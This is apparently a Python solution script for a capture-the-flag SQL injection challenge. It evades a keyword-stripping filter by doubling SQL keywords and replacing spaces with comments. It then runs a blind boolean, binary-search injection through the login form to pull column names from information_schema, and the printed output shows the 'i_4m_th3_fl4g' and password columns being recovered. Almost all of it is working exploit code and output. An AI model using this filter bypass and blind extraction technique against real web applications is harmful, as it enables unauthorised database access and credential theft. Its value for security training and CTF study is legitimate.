# %%
import requests

# %%
def waf(p):
    p = p.replace(" ", "/**/")
    p = p.replace("union", "uniunionon")
    p = p.replace("select", "seleselectct")
    p = p.replace("where", "whwhereere")
    p = p.replace("and", "aandnd")
    p = p.replace("or", "oorr")
    return p

def check(password):
    payload = waf(password) + '#'
    retry = 3
    while retry > 0:
        res = requests.post("https://sqli.chal.h4ck3r.quest/login", data={"username": "\\", "password": payload})
        if res.status_code == 200:
            # print(res.text)
            return res.text == 'Welcome!'
        retry -= 1
        
    raise Exception("retry failed!")

# %%
base_password=" union select 1,2,3"

def crack_ascii(pos):
    start = 0
    end = 128
    while start <= end:
        mid = int(start + (end - start) / 2)
        # print(start, mid, end)
        password = base_password + f" where (ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema LIKE database()),{pos},1))<{mid})"
        stat = check(password)
        if stat == True:
            end = mid - 1
            if start > end:
                return end
        else:
            start = mid + 1
            if start > end:
                return mid
            
table_name = ""
for i in range(1, 1000):
    table_name += chr(crack_ascii(i))
    print(table_name)
# Out:
# i
# i_
# i_4
# i_4m
# i_4m_
# i_4m_t
# i_4m_th
# i_4m_th3
# i_4m_th3_
# i_4m_th3_f
# i_4m_th3_fl
# i_4m_th3_fl4
# i_4m_th3_fl4g
# i_4m_th3_fl4g,
# i_4m_th3_fl4g,p
# i_4m_th3_fl4g,pa
# i_4m_th3_fl4g,pas
# i_4m_th3_fl4g,pass
# i_4m_th3_fl4g,passw
# i_4m_th3_fl4g,passwo
# i_4m_th3_fl4g,passwor
# i_4m_th3_fl4g,password
# i_4m_th3_fl4g,password,
# i_4m_th3_fl4g,password,u
# i_4m_th3_fl4g,password,ui
# i_4m_th3_fl4g,password,uid
# i_4m_th3_fl4g,password,uid,
# i_4m_th3_fl4g,password,uid,u
# i_4m_th3_fl4g,password,uid,us
# i_4m_th3_fl4g,password,uid,use
# i_4m_th3_fl4g,password,uid,user
# i_4m_th3_fl4g,password,uid,usern
# i_4m_th3_fl4g,password,uid,userna
# i_4m_th3_fl4g,password,uid,usernam
# i_4m_th3_fl4g,password,uid,username
# i_4m_th3_fl4g,password,uid,username
# i_4m_th3_fl4g,password,uid,username
# i_4m_th3_fl4g,password,uid,username
# i_4m_th3_fl4g,password,uid,username
# i_4m_th3_fl4g,password,uid,username
# i_4m_th3_fl4g,password,uid,username
# ...
